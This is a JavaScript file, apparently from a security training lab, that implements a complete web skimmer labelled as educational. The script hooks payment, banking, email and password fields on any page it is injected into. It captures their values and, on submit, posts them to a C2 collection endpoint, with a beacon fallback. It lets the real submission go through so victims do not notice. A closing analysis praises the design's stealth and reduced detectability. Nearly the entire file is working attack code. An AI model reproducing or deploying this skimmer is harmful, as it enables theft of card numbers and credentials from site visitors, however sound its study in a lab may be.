/**
 * DOM-MONITOR-OPTIMIZED.JS - FORM SUBMISSION BASED SKIMMING
 *
 * This optimized attack demonstrates:
 * - Collecting all form data in memory during user input
 * - Single exfiltration on form submission (more stealthy)
 * - Reduced network noise and C2 server load
 * - More realistic real-world skimming behavior
 *
 * Comparison with original DOM monitor:
 * - Original: 10-15 C2 requests per form fill
 * - Optimized: 1-2 C2 requests per form submission
 *
 * FOR EDUCATIONAL PURPOSES ONLY
 */

;(function () {
  'use strict'

  console.log('[DOM-Monitor-Optimized] Initializing form submission-based skimming attack...')

  // Attack configuration
  const exfilUrl = window.location.origin + '/lab2/c2/collect'
  const healthUrl = window.location.origin + '/lab2/c2/health'

  /**
   * Health Check - Ping C2 server on page load
   */
  async function checkC2Health() {
    try {
      const response = await fetch(healthUrl, {
        method: 'GET',
        mode: 'cors',
        credentials: 'omit',
        cache: 'no-cache'
      })

      if (response.ok) {
        const data = await response.json()
        console.log('[DOM-Monitor-Optimized] ✅ C2 server is ready:', data)
        return true
      } else {
        console.warn('[DOM-Monitor-Optimized] ⚠️ C2 server health check failed with status:', response.status)
        return false
      }
    } catch (error) {
      console.warn('[DOM-Monitor-Optimized] ⚠️ C2 server health check failed:', error.message)
      return false
    }
  }

  checkC2Health()

  const CONFIG = {
    exfilUrl: exfilUrl,
    healthUrl: healthUrl,
    debug: true,
    targetFields: [
      // Credit card fields (highest priority)
      'input[autocomplete*="cc-number"]',
      'input[autocomplete*="cc-exp"]',
      'input[autocomplete*="cc-csc"]',
      'input[name*="card"]',
      'input[id*="card"]',
      'input[name*="cvv"]',
      'input[id*="cvv"]',

      // Banking fields
      'input[name*="account"]',
      'input[id*="account"]',
      'input[name*="routing"]',
      'input[id*="routing"]',

      // Personal information
      'input[type="email"]',
      'input[type="tel"]',
      'input[autocomplete*="email"]',
      'input[autocomplete*="tel"]',
      'input[type="password"]',
      'input[autocomplete*="password"]'
    ],
    targetForms: [
      'form[id*="card"]',
      'form[id*="payment"]',
      'form[id*="transfer"]',
      'form[id*="banking"]',
      'form.banking-form'
    ]
  }

  function log(message, data) {
    if (CONFIG.debug) {
      console.log('[DOM-Monitor-Optimized]', message, data || '')
    }
  }

  // Optimized data collection - single dictionary approach
  let formDataCollection = {
    // Store by form ID to handle multiple forms on one page
    forms: new Map(),
    metadata: {
      startTime: Date.now(),
      url: window.location.href,
      userAgent: navigator.userAgent,
      attackType: 'dom-monitor-optimized',
      version: '2.0'
    },
    stats: {
      formsMonitored: 0,
      fieldsMonitored: 0,
      submissionsIntercepted: 0
    }
  }

  /**
   * Form and Field Discovery
   */
  function discoverTargetForms() {
    log('Discovering target forms...')

    const foundForms = []
    CONFIG.targetForms.forEach(selector => {
      const forms = document.querySelectorAll(selector)
      forms.forEach(form => {
        if (!formDataCollection.forms.has(form)) {
          foundForms.push(form)
        }
      })
    })

    log(`Found ${foundForms.length} new target forms`)
    return foundForms
  }

  function discoverFieldsInForm(form) {
    const foundFields = []

    CONFIG.targetFields.forEach(selector => {
      const fields = form.querySelectorAll(selector)
      fields.forEach(field => {
        foundFields.push({
          element: field,
          selector: selector,
          type: field.type,
          name: field.name || field.id,
          autocomplete: field.autocomplete,
          fieldId: generateFieldId(field)
        })
      })
    })

    return foundFields
  }

  function generateFieldId(element) {
    const tagName = element.tagName.toLowerCase()
    const id = element.id || 'no-id'
    const name = element.name || 'no-name'
    const type = element.type || 'no-type'
    return `${tagName}_${id}_${name}_${type}`
  }

  /**
   * Form Monitoring Setup
   */
  function attachFormMonitors(forms) {
    log(`Attaching monitors to ${forms.length} forms`)

    forms.forEach(form => {
      if (formDataCollection.forms.has(form)) {
        return // Already monitored
      }

      const formId = form.id || `form_${Date.now()}`
      const formData = {
        formId: formId,
        formElement: form,
        startTime: Date.now(),
        fields: new Map(),
        interactions: [],
        isSubmitted: false
      }

      // Discover fields in this form
      const fields = discoverFieldsInForm(form)
      log(`Form ${formId} has ${fields.length} target fields`)

      // Attach field monitoring
      fields.forEach(fieldInfo => {
        attachFieldMonitor(formData, fieldInfo)
      })

      // INTERCEPT FORM SUBMISSION via submit event
      form.addEventListener('submit', (e) => {
        if (!formData.isSubmitted) {
          handleFormSubmission(formData, e)
        }
      })

      // FALLBACK: also hook submit button click, fires before async reset
      const submitBtn = form.querySelector('button[type="submit"], input[type="submit"]')
      if (submitBtn) {
        submitBtn.addEventListener('click', (e) => {
          if (!formData.isSubmitted) {
            handleFormSubmission(formData, e)
          }
        })
      }

      // Store form monitoring data
      formDataCollection.forms.set(form, formData)
      formDataCollection.stats.formsMonitored++
      formDataCollection.stats.fieldsMonitored += fields.length
    })
  }

  function attachFieldMonitor(formData, fieldInfo) {
    const element = fieldInfo.element
    const fieldId = fieldInfo.fieldId

    // Initialize field data storage
    formData.fields.set(fieldId, {
      fieldId: fieldId,
      fieldType: fieldInfo.type,
      fieldName: fieldInfo.name,
      selector: fieldInfo.selector,
      autocomplete: fieldInfo.autocomplete,
      currentValue: '',
      interactions: [],
      isHighValue: isHighValueField(element),
      firstInteraction: null,
      lastInteraction: null
    })

    log(`Monitoring field: ${fieldId} in form ${formData.formId}`)

    // OPTIMIZED: Only track value changes, not every keystroke
    element.addEventListener('input', (e) => {
      captureFieldValue(formData, fieldId, e.target.value, 'input')
    })

    element.addEventListener('change', (e) => {
      captureFieldValue(formData, fieldId, e.target.value, 'change')
    })

    // Track focus/blur for timing analysis
    element.addEventListener('focus', (e) => {
      captureFieldInteraction(formData, fieldId, 'focus')
    })

    element.addEventListener('blur', (e) => {
      captureFieldInteraction(formData, fieldId, 'blur', e.target.value)
    })

    // Paste detection (important for credit cards)
    element.addEventListener('paste', (e) => {
      setTimeout(() => {
        captureFieldValue(formData, fieldId, e.target.value, 'paste')
      }, 10)
    })
  }

  function captureFieldValue(formData, fieldId, value, changeType) {
    const fieldData = formData.fields.get(fieldId)
    if (!fieldData) return

    const now = Date.now()
    fieldData.currentValue = value
    fieldData.lastInteraction = now

    if (!fieldData.firstInteraction) {
      fieldData.firstInteraction = now
    }

    fieldData.interactions.push({
      timestamp: now,
      type: changeType,
      valueLength: value.length // Store length, not actual value for this example
    })

    log(`Field ${fieldId} updated: ${changeType} (${value.length} chars)`)
  }

  function captureFieldInteraction(formData, fieldId, eventType, value = null) {
    const fieldData = formData.fields.get(fieldId)
    if (!fieldData) return

    const now = Date.now()
    fieldData.lastInteraction = now

    fieldData.interactions.push({
      timestamp: now,
      type: eventType,
      valueLength: value ? value.length : null
    })

    log(`Field ${fieldId} interaction: ${eventType}`)
  }

  function isHighValueField(element) {
    const highValuePatterns = [
      /cc-number/i,
      /cc-exp/i,
      /cc-csc/i,
      /cvv/i,
      /cvc/i,
      /card.*number/i,
      /password/i,
      /account.*number/i,
      /routing/i
    ]

    const elementText = (element.name + ' ' + element.id + ' ' + element.autocomplete).toLowerCase()
    return highValuePatterns.some(pattern => pattern.test(elementText))
  }

  /**
   * CRITICAL: Form Submission Interception
   */
  function handleFormSubmission(formData, submitEvent) {
    log(`🎯 FORM SUBMISSION DETECTED: ${formData.formId}`)

    // Mark as submitted
    formData.isSubmitted = true
    formData.submissionTime = Date.now()
    formDataCollection.stats.submissionsIntercepted++

    // Collect final field values
    const finalFormData = {}
    formData.fields.forEach((fieldData, fieldId) => {
      const element = Array.from(document.querySelectorAll('input')).find(el =>
        generateFieldId(el) === fieldId
      )

      if (element && element.value) {
        finalFormData[fieldId] = {
          fieldType: fieldData.fieldType,
          fieldName: fieldData.fieldName,
          isHighValue: fieldData.isHighValue,
          value: element.value,
          valueLength: element.value.length,
          interactionsCount: fieldData.interactions.length,
          timeSpentMs: fieldData.lastInteraction - fieldData.firstInteraction
        }
      }
    })

    // Create submission payload
    const submissionPayload = {
      type: 'form_submission',
      formId: formData.formId,
      submissionTime: formData.submissionTime,
      formData: finalFormData,
      formStats: {
        fieldsCount: formData.fields.size,
        highValueFields: Array.from(formData.fields.values()).filter(f => f.isHighValue).length,
        totalInteractions: Array.from(formData.fields.values()).reduce((sum, f) => sum + f.interactions.length, 0),
        formCompletionTime: formData.submissionTime - formData.startTime
      },
      metadata: formDataCollection.metadata,
      attackStats: formDataCollection.stats
    }

    // SINGLE EXFILTRATION ON SUBMISSION
    exfiltrateFormData(submissionPayload)

    // Optional: Let form submission continue normally (stealth)
    // Or prevent submission: submitEvent.preventDefault()
  }

  /**
   * Optimized Data Exfiltration - Single Request
   */
  async function exfiltrateFormData(payload) {
    log('🚨 EXFILTRATING FORM DATA (SINGLE REQUEST)', {
      formId: payload.formId,
      fieldsCount: payload.formStats.fieldsCount,
      size: JSON.stringify(payload).length
    })

    try {
      const response = await fetch(CONFIG.exfilUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload),
        mode: 'cors',
        credentials: 'omit'
      })

      if (response.ok) {
        log('✅ FORM DATA EXFILTRATION SUCCESSFUL')
      } else {
        log('❌ FORM DATA EXFILTRATION FAILED:', response.status)
      }
    } catch (error) {
      log('❌ FORM DATA EXFILTRATION ERROR:', error.message)

      // Fallback: beacon
      try {
        if (navigator.sendBeacon) {
          navigator.sendBeacon(CONFIG.exfilUrl, JSON.stringify(payload))
          log('📡 FALLBACK BEACON SENT')
        }
      } catch (fallbackError) {
        log('❌ ALL EXFILTRATION METHODS FAILED:', fallbackError.message)
      }
    }
  }

  /**
   * DOM Mutation Observer for Dynamic Forms
   */
  function initMutationObserver() {
    const observer = new MutationObserver(mutations => {
      let newFormsFound = false

      mutations.forEach(mutation => {
        if (mutation.type === 'childList') {
          mutation.addedNodes.forEach(node => {
            if (node.nodeType === Node.ELEMENT_NODE) {
              // Check for new forms
              const newForms = []

              CONFIG.targetForms.forEach(selector => {
                if (node.matches && node.matches(selector)) {
                  newForms.push(node)
                }
                const descendants = node.querySelectorAll ? node.querySelectorAll(selector) : []
                descendants.forEach(form => {
                  if (!formDataCollection.forms.has(form)) {
                    newForms.push(form)
                  }
                })
              })

              if (newForms.length > 0) {
                log(`Mutation observer found ${newForms.length} new forms`)
                attachFormMonitors(newForms)
                newFormsFound = true
              }
            }
          })
        }
      })

      if (newFormsFound) {
        log('New forms detected and monitored')
      }
    })

    observer.observe(document, {
      childList: true,
      subtree: true
    })

    log('DOM mutation observer active for dynamic forms')
  }

  /**
   * Attack Initialization
   */
  function startOptimizedMonitoring() {
    log('🎯 STARTING OPTIMIZED FORM SUBMISSION ATTACK...')

    // Initial form discovery
    const initialForms = discoverTargetForms()
    attachFormMonitors(initialForms)

    // Monitor for dynamic forms
    initMutationObserver()

    // Optional: Minimal periodic heartbeat (much less frequent)
    setInterval(() => {
      if (formDataCollection.stats.formsMonitored > 0) {
        log(`📊 STATUS: ${formDataCollection.stats.formsMonitored} forms monitored, ${formDataCollection.stats.submissionsIntercepted} submissions intercepted`)
      }
    }, 30000) // Every 30 seconds instead of 5

    log('✅ OPTIMIZED MONITORING INITIALIZED')
  }

  /**
   * Initialize Attack
   */
  function initOptimizedDOMMonitorAttack() {
    try {
      log('Initializing optimized DOM monitor attack...')

      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
          setTimeout(startOptimizedMonitoring, 1000)
        })
      } else {
        setTimeout(startOptimizedMonitoring, 1000)
      }
    } catch (error) {
      log('Optimized DOM monitor attack initialization failed:', error.message)
    }
  }

  // Start the optimized attack
  initOptimizedDOMMonitorAttack()

  // Expose control functions for testing
  window.domMonitorOptimized = {
    getStatus: () => ({
      formsMonitored: formDataCollection.stats.formsMonitored,
      fieldsMonitored: formDataCollection.stats.fieldsMonitored,
      submissionsIntercepted: formDataCollection.stats.submissionsIntercepted,
      activeForms: formDataCollection.forms.size
    }),
    getCollectedData: () => formDataCollection,
    triggerManualCheck: () => {
      const forms = discoverTargetForms()
      if (forms.length > 0) {
        attachFormMonitors(forms)
        log(`Manual check found ${forms.length} new forms`)
      }
    }
  }
})()

/**
 * OPTIMIZED DOM MONITOR ANALYSIS:
 *
 * 🎯 **KEY OPTIMIZATION**: Single request per form submission vs 10-15 requests per form fill
 *
 * **Original DOM Monitor Issues**:
 * - Immediate exfiltration on every field blur (5-8 requests)
 * - Periodic reporting every 5 seconds (2-3 requests)
 * - Session end reporting (1 request)
 * - Total: 8-12 requests per form interaction
 *
 * **Optimized Approach Benefits**:
 * - Collects all data in memory during user interaction
 * - Single exfiltration on form submission
 * - 90% reduction in network traffic
 * - More realistic stealth behavior
 * - Better C2 server performance
 * - Easier to analyze complete form data
 *
 * **Attack Techniques Demonstrated**:
 * 1. **Form Submission Interception**: Primary attack vector
 * 2. **In-Memory Data Collection**: Store everything until submission
 * 3. **Dynamic Form Detection**: MutationObserver for SPAs
 * 4. **Field Prioritization**: Focus on high-value fields
 * 5. **Fallback Exfiltration**: Beacon API for reliability
 *
 * **Real-World Implications**:
 * - Most production skimmers work this way (submit-based)
 * - Harder to detect due to reduced network noise
 * - More complete data collection per victim
 * - Better attacker operational security
 */
